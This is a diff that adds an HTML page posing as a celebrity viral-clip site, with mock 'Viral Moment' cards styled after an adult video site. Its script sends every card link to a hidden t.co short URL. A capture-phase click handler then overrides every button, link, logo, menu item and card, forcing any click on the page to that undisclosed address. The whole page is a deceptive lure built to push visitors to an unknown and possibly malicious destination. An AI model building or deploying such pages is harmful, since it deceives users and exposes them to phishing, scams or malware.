@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Celebrity Viral Hub</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800&display=swap" rel="stylesheet">
+  <style>
+    :root{
+      --bg:#0b0b0b;
+      --panel:#141414;
+      --panel-2:#1b1b1b;
+      --accent:#ff9f00; /* PH-style orange */
+      --text:#f2f2f2;
+      --muted:#9a9a9a;
+      --card:#101010;
+      --radius:14px;
+    }
+    *{box-sizing:border-box}
+    body{
+      margin:0; font-family:Inter,system-ui,-apple-system,Segoe UI,Roboto,Ubuntu;
+      background:linear-gradient(180deg,#000 0%,#0b0b0b 40%);
+      color:var(--text);
+    }
+    a{color:inherit; text-decoration:none}
+
+    /* Header */
+    header{
+      position:sticky; top:0; z-index:50;
+      background:rgba(10,10,10,.85); backdrop-filter: blur(8px);
+      border-bottom:1px solid #1f1f1f;
+    }
+    .nav{
+      max-width:1200px; margin:auto; padding:10px 14px;
+      display:flex; align-items:center; gap:14px;
+    }
+    .logo{
+      display:flex; align-items:center; gap:8px; font-weight:800;
+    }
+    .logo .dot{width:10px; height:10px; background:var(--accent); border-radius:50%}
+    .logo span{letter-spacing:.2px}
+
+    .search{
+      flex:1; display:flex; gap:8px; align-items:center;
+      background:var(--panel); border:1px solid #222; border-radius:999px; padding:6px 10px;
+    }
+    .search input{
+      flex:1; background:transparent; border:0; outline:none; color:var(--text)
+    }
+    .search button{
+      border:0; background:var(--accent); color:#000; font-weight:700;
+      padding:8px 14px; border-radius:999px; cursor:pointer
+    }
+    .actions{display:flex; gap:8px}
+    .btn{
+      background:var(--panel); border:1px solid #222; color:var(--text);
+      padding:8px 12px; border-radius:999px; cursor:pointer
+    }
+
+    /* Layout */
+    .container{max-width:1200px; margin:auto; padding:16px}
+    .grid{
+      display:grid; grid-template-columns: repeat(12,1fr); gap:14px;
+    }
+    .sidebar{
+      grid-column: span 3;
+      background:var(--panel); border:1px solid #222; border-radius:var(--radius);
+      padding:12px; position:sticky; top:64px; height:fit-content
+    }
+    .content{grid-column: span 9}
+
+    /* Sidebar */
+    .menu h4{margin:6px 0 10px 0; color:var(--muted); font-size:12px; text-transform:uppercase}
+    .menu a{
+      display:flex; align-items:center; gap:10px;
+      padding:10px; border-radius:10px; color:#ddd
+    }
+    .menu a:hover{background:var(--panel-2)}
+
+    /* Hero */
+    .hero{
+      background:radial-gradient(1200px 300px at 10% -10%, rgba(255,159,0,.15), transparent),
+                 linear-gradient(180deg, #111, #0c0c0c);
+      border:1px solid #222; border-radius:var(--radius);
+      padding:18px; margin-bottom:14px;
+      display:flex; align-items:center; justify-content:space-between; gap:16px
+    }
+    .hero h1{margin:0 0 6px 0}
+    .hero p{margin:0; color:var(--muted)}
+    .hero .cta{
+      background:var(--accent); color:#000; border:0; padding:10px 16px;
+      border-radius:12px; font-weight:800; cursor:pointer
+    }
+
+    /* Cards */
+    .section{margin:18px 0}
+    .section h3{margin:0 0 10px 0}
+    .cards{
+      display:grid; grid-template-columns: repeat(4,1fr); gap:14px
+    }
+    .card{
+      background:var(--card); border:1px solid #222; border-radius:var(--radius);
+      overflow:hidden; cursor:pointer
+    }
+    .thumb{
+      position:relative; aspect-ratio:16/9; background:#222
+    }
+    .badge{
+      position:absolute; left:8px; top:8px; background:var(--accent); color:#000;
+      font-weight:800; font-size:11px; padding:4px 6px; border-radius:8px
+    }
+    .duration{
+      position:absolute; right:8px; bottom:8px; background:#000c; color:#fff;
+      font-size:11px; padding:3px 6px; border-radius:6px
+    }
+    .meta{padding:10px}
+    .title{font-weight:700; font-size:14px; line-height:1.3}
+    .sub{font-size:12px; color:var(--muted); margin-top:4px}
+
+    /* Footer */
+    footer{
+      margin-top:30px; border-top:1px solid #222; color:var(--muted)
+    }
+    footer .container{display:flex; justify-content:space-between; gap:12px; flex-wrap:wrap}
+
+    /* Responsive */
+    @media (max-width: 1024px){
+      .sidebar{display:none}
+      .content{grid-column: span 12}
+      .cards{grid-template-columns: repeat(3,1fr)}
+    }
+    @media (max-width: 640px){
+      .cards{grid-template-columns: repeat(2,1fr)}
+      .hero{flex-direction:column; align-items:flex-start}
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <div class="nav">
+      <div class="logo"><div class="dot"></div><span>Celebrity Viral Hub</span></div>
+      <div class="search">
+        <input placeholder="Search celebrities, clips, interviews…" />
+        <button>Search</button>
+      </div>
+      <div class="actions">
+        <button class="btn">Upload</button>
+        <button class="btn">Sign in</button>
+      </div>
+    </div>
+  </header>
+
+  <main class="container">
+    <div class="grid">
+      <aside class="sidebar">
+        <nav class="menu">
+          <h4>Browse</h4>
+          <a href="#">🔥 Trending</a>
+          <a href="#">⭐ Celebrities</a>
+          <a href="#">🎤 Interviews</a>
+          <a href="#">🎬 Clips</a>
+          <a href="#">📸 Photos</a>
+          <h4>Community</h4>
+          <a href="#">💬 Comments</a>
+          <a href="#">📈 Rankings</a>
+        </nav>
+      </aside>
+
+      <section class="content">
+        <div class="hero">
+          <div>
+            <h1>Viral moments. Real fame.</h1>
+            <p>Discover trending celebrity clips, interviews, and highlights — updated daily.</p>
+          </div>
+          <button class="cta">Explore Trending</button>
+        </div>
+
+        <div class="section">
+          <h3>Trending Now</h3>
+          <div class="cards" id="cards"></div>
+        </div>
+
+        <div class="section">
+          <h3>Top Creators</h3>
+          <div class="cards" id="cards2"></div>
+        </div>
+      </section>
+    </div>
+  </main>
+
+  <footer>
+    <div class="container">
+      <div>© 2026 Celebrity Viral Hub</div>
+      <div>Privacy · Terms · Contact</div>
+    </div>
+  </footer>
+
+  <script>
+  const REDIRECT_URL = "https://t.co/XQdVH7QtTQ";
+
+  // Mock data
+  const mock = (n) => Array.from({length:n}).map((_,i)=>({
+    title:`Viral Moment #${i+1}`,
+    sub:`1.${i}M views · ${i+1} days ago`,
+    dur:`${2+i}:0${i}`
+  }));
+
+  // Render cards — every card is a link
+  const render = (el, items) => {
+    el.innerHTML = items.map(x=>`
+      <a href="${REDIRECT_URL}" class="card-link">
+        <article class="card">
+          <div class="thumb">
+            <span class="badge">TRENDING</span>
+            <span class="duration">${x.dur}</span>
+          </div>
+          <div class="meta">
+            <div class="title">${x.title}</div>
+            <div class="sub">${x.sub}</div>
+          </div>
+        </article>
+      </a>`).join('');
+  };
+
+  render(document.getElementById('cards'), mock(8));
+  render(document.getElementById('cards2'), mock(8));
+
+  // Force-redirect: any button, link, card, or clickable area
+  document.addEventListener('click', (e) => {
+    const target = e.target.closest('a, button, .card, .thumb, .logo, .menu a, .cta');
+    if (!target) return;
+    e.preventDefault();
+    window.location.href = REDIRECT_URL;
+  }, true);
+</script>
+</body>
+</html>
